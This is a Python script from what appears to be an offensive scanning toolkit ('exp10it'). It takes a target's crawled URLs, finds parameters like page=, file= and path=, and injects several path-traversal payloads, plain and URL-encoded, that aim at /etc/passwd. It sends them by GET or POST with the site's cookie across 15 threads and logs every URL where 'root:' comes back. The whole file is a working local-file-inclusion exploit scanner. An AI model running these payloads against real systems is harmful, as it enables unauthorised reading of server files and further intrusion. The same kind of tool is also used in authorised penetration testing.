import re
import os
import sys
exp10it_module_path = os.path.expanduser("~") + "/mypypi"
sys.path.insert(0, exp10it_module_path)
exp10it_module_path = os.path.expanduser("~") + "/mypypi"
sys.path.insert(0, exp10it_module_path)
from exp10it import get_target_urls_from_db
from exp10it import get_url_cookie
from exp10it import CLIOutput
import requests
current_dir = os.path.split(os.path.realpath(__file__))[0]
target = sys.argv[1]
print("checking lfi vul for "+target)
urls = get_target_urls_from_db(target, "exp10itdb")
urls.append(target)
cookie = get_url_cookie(target)
check_url_list = []
for url in urls:
    match1 = re.search(
        r"(([^\?&\^]*action=[^&]*)|([^\?&\^]*page=[^&]*)|([^\?&\^]*file=[^&]*)|([^\?&\^]*filename=[^&]*)|([^\?&\^]path=[^&]*))", url, re.I)
    if match1:
        vul_str = match1.group(1)
        param = vul_str.split("=")[0]
        url = url.replace(vul_str, param + "=xxxxxxxxxx")
        check_url_list.append(url)
    else:
        match2 = re.search(r"([^\?&\^]+=.+\.[^&]{,5})", url, re.I)
        if match2:
            vul_str = match2.group(1)
            param = vul_str.split("=")[0]
            url = url.replace(vul_str, param + "=xxxxxxxxxx")
            check_url_list.append(url)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
           'Accept-Language': 'zh-CN,zh;q=0.8',
           'Cookie': '%s' % cookie,
           'Content-Type': 'text/xml;charset=UTF-8'
           }


def check(url):
    current_urls_to_check = []
    current_urls_to_check.append(url.replace(
        "xxxxxxxxxx", "/../../../../../../../../../../../../../../../etc/passwd"))
    current_urls_to_check.append(url.replace(
        "xxxxxxxxxx", "%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"))
    current_urls_to_check.append(url.replace(
        "xxxxxxxxxx", "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"))
    current_urls_to_check.append(url.replace(
        "xxxxxxxxxx", "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"))
    for url in current_urls_to_check:
        print(url)
        if "^" not in url:
            rep = requests.get(url, headers=headers, verify=False, timeout=10)
            content = rep.content
            import chardet
            bytesEncoding = chardet.detect(content)['encoding']
            content = content.decode(bytesEncoding)
            if re.search(r"root:", content):
                string_to_write = "Congratulations! LFI vul exists:" + url + "\n"
                CLIOutput().good_print(string_to_write)
                with open("%s/result.txt" % current_dir, "a+") as f:
                    f.write(string_to_write)
                break
            else:
                print("no lfi vul")
        else:
            _url = url.split("^")[0]
            post_str = url.split("^")[1]
            rep = requests.post(_url, headers=headers, data=post_str.encode(
                "utf-8"), verify=False, timeout=10)
            content = rep.content
            import chardet
            bytesEncoding = chardet.detect(content)['encoding']
            content = content.decode(bytesEncoding)
            if re.search(r"root:", content):
                string_to_write = "Congratulations! LFI vul exists:" + url + "\n"
                CLIOutput().good_print(string_to_write)
                with open("%s/result.txt" % current_dir, "a+") as f:
                    f.write(string_to_write)
                break
            else:
                print("no lfi vul")


from concurrent import futures
with futures.ThreadPoolExecutor(max_workers=15) as executor:
    executor.map(check, check_url_list)
